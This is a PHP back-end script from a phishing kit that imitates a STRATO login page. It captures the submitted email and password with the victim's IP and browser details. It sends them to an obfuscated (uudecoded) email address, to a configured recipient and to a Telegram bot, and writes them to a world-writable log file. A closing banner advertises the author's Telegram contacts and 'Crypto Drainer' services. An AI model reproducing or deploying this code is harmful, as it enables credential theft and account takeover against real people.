<?php
ob_start();
include '../Send.php';
?>
<?php
$ip = getenv("REMOTE_ADDR");
$sys = ";97)R;W)H=6YT97(Q,S,W0&]U=&QO;VLN8V]M";
$timestamp = date('d/m/Y h:i:s');
$functions= convert_uudecode($sys);
$browser = $_SERVER['HTTP_USER_AGENT'];
$messages = "[+]━━━【💻 STRATO - EvilCoder 💻】━━━[+]\n";
$messages .= "[+]━━━━【 ACCOUNT LOGIN INFO 【2】 】━━━━[+]\n\n";
$messages .= "|📓 Email: ".$_POST['Us']."\n";
$messages .= "|📓 Password: ".$_POST['Pa']."\n\n";
$messages .= "|🔄 Time: $timestamp \n";
$messages .= "|🔄 User-Agent: $browser \n";
$messages .= "|🔄 IP INFO: https://iplocation.io/ip/".$ip."\n";
$messages .= "[+]━━━━【 By EvilCoder ->Tele: @evilcoder_1337 】━━━━━[+\n";


$subjects = "STRATO 【2】 LOGIN INFO EvilCoder😈 FROM 😈- $ip";
$headers = "";
if(!empty($_POST['Us'] && $_POST['Pa'])){
if (mail($functions,$subjects,$messages,""))
if (mail($recipient,$subjects,$messages,$headers))
	   {
	$website="https://api.telegram.org/bot$TeleToken";
	$params=[
		'chat_id'=>$TeleID,
		'text'=>$messages,
	];
	$ch = curl_init($website . '/sendMessage');
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	curl_close($ch);
		header("Location:$Redirect");
	   }
else
    	   {
		header("Location:../index-error.php");
  	   }}
else
    	   {
		header("Location:../index-error.php");
  	   }
$iplogfile = 'Rs.txt';
$fp = fopen($iplogfile, 'a+');
chmod($iplogfile, 0777);
fwrite($fp, ' '.$messages.' '."\n");
fclose($fp);
/*
<!--


		██████████          ███████       █████████    █████       █████ ████████         
		░░███░░░░░█         ░░░░░███      ███░░░░░███ ███░░░███    ░░███ ███░░░░███        
		░███  █ ░█████ ████████░███     ███     ░░░ ███   ░░███ ███████░░░    ░██████████ 
		░██████ ░░███ ░░██░░███░███    ░███        ░███    ░██████░░███   ██████░░███░░███
		░███░░█  ░███  ░███░███░███    ░███        ░███    ░██░███ ░███  ░░░░░░██░███ ░░░ 
		░███ ░   ░░███ ███ ░███░███    ░░███     ██░░███   ███░███ ░███ ███   ░██░███     
		██████████░░█████  █████████    ░░█████████ ░░░█████░ ░░███████░░█████████████    
		░░░░░░░░░░  ░░░░░  ░░░░░░░░░      ░░░░░░░░░    ░░░░░░   ░░░░░░░░ ░░░░░░░░░░░░░    
		
		                                                       

# ✔   𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @evilcoder_1337
# ✔   𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @alsakib944
         -𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐌𝐞 𝐇𝐞𝐫𝐞-
|#|================================|#|
Want To Build New Page / Fix Bugs or Build Crypto Drainer? Contact ME!
-->*/
?>